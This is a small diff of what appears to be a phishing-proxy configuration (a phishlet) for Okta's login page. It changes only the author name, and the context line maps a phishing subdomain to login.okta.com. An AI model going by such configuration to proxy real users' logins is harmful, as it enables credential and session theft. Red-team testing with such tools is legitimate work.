@@ -1,4 +1,4 @@
-author: '@ahhh'
+author: '@mikesiegel'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false}
